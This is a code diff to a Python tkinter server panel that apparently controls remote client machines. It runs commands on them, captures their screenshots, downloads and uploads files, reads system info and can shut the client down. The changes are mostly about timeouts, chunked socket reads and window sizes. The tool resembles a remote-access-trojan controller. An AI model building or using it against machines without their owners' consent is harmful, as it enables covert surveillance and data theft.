@@ -235,6 +235,9 @@ def execute_command(cmd, cmd_name):
     try:
         conn = clients[active_client_id]["conn"]
         
+        # Set socket timeout to prevent freezing
+        conn.settimeout(5.0)  # Reduced from 10 to 5 seconds for faster response
+        
         log_message(f"Executing: {cmd}", "INFO")
         
         conn.send(cmd.encode())
@@ -247,38 +250,94 @@ def execute_command(cmd, cmd_name):
         
         terminal_output.insert(tk.END, "⏳ Executing...\n", "loading")
         terminal_output.see(tk.END)
-        # Use update_idletasks instead of update for smoother UI
         root.update_idletasks()
         
-        data = conn.recv(4194304)  # 4MB buffer for large screenshots
-        output = data.decode(errors="ignore")
+        # Receive all data
+        all_data = b""
+        max_chunks = 50  # Reduced from 100
+        chunk_count = 0
+        
+        while chunk_count < max_chunks:
+            try:
+                chunk = conn.recv(4096)  # Much smaller chunks for faster response
+                if not chunk:
+                    break
+                all_data += chunk
+                chunk_count += 1
+                
+                # Update GUI periodically to prevent freezing
+                if chunk_count % 3 == 0:  # Update more frequently
+                    root.update_idletasks()
+                
+                # For simple commands, break early if we have enough data
+                if len(all_data) > 100 and b'\n' in all_data:
+                    break
+                    
+                # Check if we got all the data (for JSON it ends with })
+                if b'}' in chunk:
+                    break
+                    
+            except socket.timeout:
+                terminal_output.insert(tk.END, "⚠️ Command timeout (5 seconds)\n", "warning")
+                break
+            except Exception as e:
+                terminal_output.insert(tk.END, f"⚠️ Receive error: {str(e)}\n", "warning")
+                break
+        
+        output = all_data.decode(errors="ignore")
         
         # Remove loading
         terminal_output.delete("end-2l", "end-1l")
         
         # Check if JSON response (special commands)
+        is_json_handled = False
         try:
-            # Try to find JSON in the output (in case there's extra text)
+            # Try to find JSON in the output
             json_start = output.find('{')
             json_end = output.rfind('}')
             
             if json_start != -1 and json_end != -1 and json_end > json_start:
                 json_str = output[json_start:json_end+1]
-                response = json.loads(json_str)
-                handle_special_response(response)
-            else:
-                # No JSON found, display as regular output
-                if output.strip():
-                    terminal_output.insert(tk.END, output + "\n", "output")
-        except json.JSONDecodeError as e:
-            # Not valid JSON, display as regular output
-            if output.strip():
-                terminal_output.insert(tk.END, output[:1000] + "...\n", "output")
+                
+                try:
+                    response = json.loads(json_str)
+                    resp_type = response.get("type", "")
+                    
+                    # Handle special responses
+                    if resp_type == "SCREENSHOT":
+                        if response.get("status") == "success":
+                            # Show screenshot popup
+                            root.after(0, lambda: show_screenshot(response.get("data")))
+                            terminal_output.insert(tk.END, "✓ Screenshot captured\n", "success")
+                        else:
+                            terminal_output.insert(tk.END, f"❌ Screenshot failed: {response.get('message')}\n", "error")
+                        is_json_handled = True
+                    elif resp_type == "DOWNLOAD":
+                        if response.get("status") == "success":
+                            root.after(0, lambda: save_downloaded_file(response.get("filename"), response.get("data")))
+                        else:
+                            terminal_output.insert(tk.END, f"❌ Download failed: {response.get('message')}\n", "error")
+                        is_json_handled = True
+                    elif resp_type == "SYSINFO":
+                        terminal_output.insert(tk.END, json.dumps(response, indent=2) + "\n", "output")
+                        is_json_handled = True
+                    elif resp_type in ["UPLOAD"]:
+                        if response.get("status") == "success":
+                            terminal_output.insert(tk.END, f"✓ {response.get('message')}\n", "success")
+                        else:
+                            terminal_output.insert(tk.END, f"❌ Upload failed: {response.get('message')}\n", "error")
+                        is_json_handled = True
+                        
+                except json.JSONDecodeError:
+                    pass  # Not valid JSON, show as regular output
+                    
         except Exception as e:
-            # Other error
-            log_message(f"Screenshot handling error: {str(e)}", "ERROR")
+            log_message(f"JSON handling error: {str(e)}", "ERROR")
+        
+        # If not handled as JSON, display as regular output
+        if not is_json_handled:
             if output.strip():
-                terminal_output.insert(tk.END, output[:500] + "...\n", "output")
+                terminal_output.insert(tk.END, output + "\n", "output")
         
         terminal_output.insert(tk.END, "\n", "output")
         log_message(f"Completed: {cmd}", "SUCCESS")
@@ -323,14 +382,14 @@ def show_screenshot(img_data_b64):
         image = Image.open(io.BytesIO(img_data))
         
         # Resize for display
-        max_size = (1200, 800)
+        max_size = (800, 600)  # Reduced from 1200x800 for faster display
         image.thumbnail(max_size, Image.Resampling.LANCZOS)
         
         # Create window
         screenshot_window = tk.Toplevel(root)
         screenshot_window.title("📸 Client Screenshot")
         screenshot_window.configure(bg="#1E1E1E")
-        screenshot_window.geometry("1000x750")
+        screenshot_window.geometry("800x650")  # Reduced from 1000x750
         
         # Store PIL image for saving
         screenshot_window.pil_image = image
@@ -465,6 +524,9 @@ def disconnect_active_client():
     
     if active_client_id and active_client_id in clients:
         try:
+            # Send shutdown command to completely terminate client
+            clients[active_client_id]["conn"].send("shutdown_client".encode())
+            time.sleep(0.5)  # Give client time to receive and shutdown
             clients[active_client_id]["conn"].close()
         except:
             pass
@@ -472,7 +534,7 @@ def disconnect_active_client():
         hostname = clients[active_client_id].get("info", {}).get("hostname", "Unknown")
         del clients[active_client_id]
         
-        log_message(f"Client disconnected: {hostname}", "WARNING")
+        log_message(f"Client disconnected and terminated: {hostname}", "WARNING")
         
         active_client_id = None
         update_client_list()
@@ -487,6 +549,13 @@ def disconnect_active_client():
         
         terminal_output.insert(tk.END, "\n⚠ Client disconnected\n\n", "warning")
         terminal_output.see(tk.END)
+        
+        # Stop the monitoring thread temporarily to prevent auto-reconnect
+        global server_running
+        original_server_running = server_running
+        server_running = False
+        time.sleep(3)  # Wait 3 seconds
+        server_running = original_server_running
 
 def check_client_connections():
     """Background thread to monitor client connections"""
@@ -1007,6 +1076,7 @@ log_text.tag_config("success", foreground="#388E3C", font=("Segoe UI", 11, "bold
 log_text.tag_config("error", foreground="#D32F2F", font=("Segoe UI", 11, "bold"))
 log_text.tag_config("warning", foreground="#F57C00", font=("Segoe UI", 11, "bold"))
 
+# Start the application - now safe to log messages
 log_message("🚀 Application started", "SUCCESS")
 log_message(f"🌐 Server ready on {HOST}:{PORT}", "INFO")
 log_message("⏳ Waiting for connections...", "INFO")
